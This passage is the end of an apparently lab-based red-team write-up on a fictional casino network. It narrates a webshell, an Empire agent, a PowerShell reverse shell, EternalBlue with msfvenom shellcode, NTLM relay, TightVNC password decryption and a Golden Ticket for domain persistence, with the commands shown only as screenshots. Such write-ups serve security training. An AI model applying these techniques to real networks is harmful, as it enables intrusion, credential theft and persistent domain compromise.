<p>Visiting the payload directly I can interact with the webshell which gives me a prompt for code execution.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-233.png?w=624" alt="" width="624" height="485" role="presentation"></p>
<p>Now I’ll upgrade to an Empire agent to utilize the tools built within again and keep my enumeration running, but I do have to be creative and fix some formatting with my agent since I was receiving errors when executing the PowerShell command from Empire, once I get an agent calling back, I see the current user being DefaultAppPool</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-234.png?w=624" alt="" width="624" height="67" role="presentation"></p>
<p>Sometimes you will encounter some issues since the host is running Windows 7 host or older generations of Windows mostly C2’s in this age focus on Windows 10 and above so they tend to have a little more trouble with targeting these systems, but they still exist!! Not as quite as popular in the day but believe me as small as 2% I’ve encounter these systems myself don’t focus to much, but give them a little research you’d be surprised the area of possibilities in operating systems like these so mix your technique catch shells with ncat or maybe use well know tools such as Metasploit this one has been available since 2003 so they’ve had some work done with the generations of windows when they started.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-235.png?w=624" alt="" width="624" height="429" role="presentation"></p>
<p>I’ve used a little bit of creativity and testing when using a PowerShell reverse shell used for Version 5.0 and above, some character escaping and encoding are quite helpful in this scenario as some modules and functions didn’t exist until later versions of PowerShell this is just a neat little example for a basic reverse shell, don’t!!! But it’s still there just in case, but don’t, since the communication is simple TCP with no encryption.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-236.png?w=624" alt="" width="624" height="173" role="presentation"></p>
<p>—-[Extra, Extra!!: Exploitation]———————————————————————————————</p>
<p>I want to demonstrate an alternative to the WebApp option for lateral movement in our nmap scan we also encountered that port 445 was available for exploration if we take a better look you can tell that it’s running on Windows 7 Service Pack 1 vulnerable to EternalBlue Exploit there are multiple ways to approach this technique we can utilize Metasploit[6], or directly from Empire we can also take a look at open source projects that utilize this exploit for giving us a reverse shell but do be careful of what you are running from the internet there are some jokesters out there giving out fake exploits, trolls or actually backdoor to your attacking machine, things to consider when running Open Source tooling, is building a reputation[7] where we know this isn’t malicious it’s quite hard so just an idea.<br>
In my first method I’ll use Metasploit for it take a look at the following screenshot noticing the options available for the exploit</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-237.png?w=624" alt="" width="624" height="277" role="presentation"></p>
<p>I’ve added all the required values to the exploitation module now when I execute, I will be catching a reverse shell via ncat since the shellcode is simply using an msfvenom shellcode, proceeding with executing the module from Empire building the shellcode with msfvenom is quite simple.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-238.png?w=624" alt="" width="624" height="177" role="presentation"></p>
<p>Now all we need to do is place the shellcode that’s between the curly brackets onto the value “Shellcode” in Empire, when executing this module, I will receive a callback onto my ncat listener</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-239.png?w=624" alt="" width="624" height="265" role="presentation"></p>
<p>The previous screenshots demonstrates the successful exploit and capturing of a reverse shell connection, since the setup used here was an ncat shell, play around to capture maybe on a different C2 or straight from Empire but since it’s tricky working from a Docker I stopped here but I do recommend giving this method a try, in my case I’ve encountered errors I won’t even bother since the OS is not on the supported list of Empire maybe giving it a try with Kali Linux should work</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-240.png?w=624" alt="" width="624" height="132" role="presentation"></p>
<p>—-[End Exploitation]———————————————————————————————————–</p>
<p>From here I can start enumerating when I looked at potential privilege escalation techniques or lateral movement techniques as well as credential access techniques, an interesting location to look at is the scheduled tasks location.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-241.png?w=624" alt="" width="624" height="116" role="presentation"></p>
<p>With windows 7, 8, 10, 11 the Task information has slightly changed here we can actually locate an XML file in the System32 folder, but in later versions I have to locate the Task information via Registry Keys, luckily for me in Windows 7 the XML file exists.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-242.png?w=593" alt="" width="593" height="120" role="presentation"></p>
<p>Reading that file I can see that the mgarcia user is trying to run a ps1 file, so I have some options to elevate my privileges to manipulate the scheduled task, read the ps1 file and hope for credentials or replace it, grab credentials from the scheduled task or capture hashes since I see no credentials on the task itself and the file has no hard-coded credentials since it is running in the context of mgarcia which I will assume the it is using NetNTLMv2[3] for authentication I can probably elevate my privileges using the HotPotato[4] technique or it’s other variants or maybe try and capture the hashes, but since I am aware that all the passwords are complicated passwords that would take time in cracking I will apply the NTLM Relay[5] technique in summary.</p>
<p>I will respond to the NetNTLM request, but I won’t be capturing the hashes instead I will use ntlmrelay to relay or send the hashes to another workstation where the user is an Administrator and with that I can gain command execution and keep moving forward</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-243.png?w=624" alt="" width="624" height="235" role="presentation"></p>
<p>In the screenshot above I told ntlmrelay to target the 10.10.1.138 IP which I know it’s the next workstation, we can actually pass it a list of IPs but beware of SMB Signing[5] this has to be disabled, since the function tells if someone has changed a message during transmission, then the hashes won’t match, and SMB will know that someone tampered with the data. The signature also confirms the sender’s and receiver’s identities.</p>
<p>A good tool for testing this is via netexec.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-244.png?w=624" alt="" width="624" height="124" role="presentation"></p>
<p>I now utilized the relay technique to execute a PowerShell Empire agent on the targeted workstation.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-245.png?w=624" alt="" width="624" height="235" role="presentation"></p>
<p>I can now interact with the new agent.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-246.png?w=624" alt="" width="624" height="182" role="presentation"></p>
<p>Now with the final workstation compromised I have access to everything, right? not really I don’t have DA and the current user isn’t even a user it’s a workstation account (SYSTEM) now for the final goal I have to reach the DC (Domain Controller) I’ll did a quick nmap scan to check what are my possibilities to move onto the next workstation</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-247.png?w=624" alt="" width="624" height="436" role="presentation"></p>
<p>A little more detailed port scan on the VNC ports</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-248.png?w=624" alt="" width="624" height="308" role="presentation"></p>
<p>Now TightVNC[7] holds the password in the Registry Keys, since we have SYSTEM level access we can read the Keys and find the values of those keys since VNC is enabled on this workstation and the Domain Controller</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-249.png?w=624" alt="" width="624" height="114" role="presentation"></p>
<p>Now VNC uses a hard-coded DES key to store credentials. The same key is used across multiple product lines. To decrypt this, we can actually use a Linux One Liner</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-251.png?w=624" alt="" width="624" height="89" role="presentation"></p>
<p>I can utilize a RealVNC[8] Viewer client via the proxy, but I do recommend utilizing the same applications as the environment just in case any new signatures that don’t belong are left on the network connection.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-252.png?w=624" alt="" width="624" height="418" role="presentation"></p>
<p>Now I could dump hashes in the Domain but we wan to be quite remember!! So instead of dumping all the NTLM hashes available in the DC I’ll just grab myself a Golden Ticket for my persistence for that I will grab the AES hash of KRBTGT.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-253.png?w=624" alt="" width="624" height="122" role="presentation"></p>
<p>And now I can use Rubeus to create a Golden Ticket [10]</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-254.png?w=624" alt="" width="624" height="293" role="presentation"></p>
<p>Rubeus will output a Base64 encoded ticket which we can pass onto our current session and enumerate the Domain Controller</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-255.png?w=624" alt="" width="624" height="455" role="presentation"></p>
<p>And with that we have gain complete Domain Dominance over the network at Tropicana Royale Casino, we gained Initial Access via Exploiting a public application used on a “IOT” Device which contained an RCE exploit, enumerated the Active Directory in a Linux OS environment, bypassed security products understanding it at a high-level our detection’s on the “why” and some of the “how” utilized a C2 framework inside a Docker container, setup python virtual environments for our tools, persistence via stolen SSH Keys, Lateral Movement with Web Application exploitation, Internal Running Services exploitation to run custom shellcode (EternalBlue), NTLM Relay, found interesting files, some advice on Malleable profiles, protocols used in an AD, Proxies, Golden Tickets for Persistence and other techniques.</p>
<p>Well thanks for following me in this little Adventure. Hopefully it was entertaining and gave you some insight on my POV in hacking and Red Team and of course some small red team knowledge. Now go and Rob Casinos!!!</p>
<p><em>Legally…</em></p>
<p>[1] <a href="https://en.wikipedia.org/wiki/EternalBlue" rel="noopener nofollow ugc">https://en.wikipedia.org/wiki/EternalBlue</a></p>
<p>[2] <a href="https://github.com/epi052/feroxbuster" rel="noopener nofollow ugc">https://github.com/epi052/feroxbuster</a></p>
<p>[3] <a href="https://en.wikipedia.org/wiki/NTLM" rel="noopener nofollow ugc">https://en.wikipedia.org/wiki/NTLM</a></p>
<p>[4] <a href="https://foxglovesecurity.com/2016/01/16/hot-potato/" rel="noopener nofollow ugc">https://foxglovesecurity.com/2016/01/16/hot-potato/</a></p>
<p>[5] <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing" rel="noopener nofollow ugc">https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing</a></p>
<p>[6] <a href="https://www.metasploit.com/" rel="noopener nofollow ugc">https://www.metasploit.com/</a></p>
<p>[7] <a href="https://www.wired.com/story/jia-tan-xz-backdoor/" rel="noopener nofollow ugc">https://www.wired.com/story/jia-tan-xz-backdoor/</a></p>
<p>[8] <a href="https://notes.offsec-journey.com/enumeration/vnc" rel="noopener nofollow ugc">https://notes.offsec-journey.com/enumeration/vnc</a></p>
<p>[9] <a href="https://www.realvnc.com/" rel="noopener nofollow ugc">https://www.realvnc.com/</a></p>
<p>[10] <a href="https://blog.netwrix.com/2022/08/31/complete-domain-compromise-with-golden-tickets/" rel="noopener nofollow ugc">https://blog.netwrix.com/2022/08/31/complete-domain-compromise-with-golden-tickets/</a></p>
          <p><a href="https://0x00sec.org/t/how-to-rob-a-casino/40556/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-to-rob-a-casino/40556/1</link>
        <pubDate>Thu, 16 May 2024 12:43:31 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-40556-1</guid>
        <source url="https://0x00sec.org/t/how-to-rob-a-casino/40556.rss">How To Rob a Casino</source>
      </item>
  </channel>
</rss>
